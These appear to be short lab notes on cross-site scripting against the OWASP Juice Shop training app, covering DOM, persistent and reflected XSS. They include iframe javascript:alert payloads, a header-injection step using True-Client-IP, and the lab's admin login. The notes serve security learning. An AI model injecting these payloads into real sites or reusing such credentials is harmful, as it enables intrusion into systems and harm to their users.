# Where did that come from? 

OWASP TOP 10 - Cross-site Scripting

Three major types of XSS:
- DOM Based 
- Stored/Persistent XSS (server-side)
- Reflected XSS (client-side)

## Practical

### DOM XSS
```
<iframe src="javascript:alert('xss')">
<iframe src="javascript:alert(`xss`)"> 
```


### Persistent XSS

admin@juice-sh.op:admin123

Add XSS Payload in HTTP headers before forwarding the logout request
```
True-Client-IP: <iframe src="javascript:alert(`xss`)">
```

![8d6ad0c47eebd90085d199cdaf293702.png](../../_resources/d1fab5aaaf064b66ba69cb0e5cd8671e.png)


### Reflected XSS

```
<iframe src="javascript:alert(`xss`)">
``` 

![b8c1563c17e59b42af2ea0a66484f51d.png](../../_resources/90b3bfc1a41d4b62a44ca9efd5202dfd.png)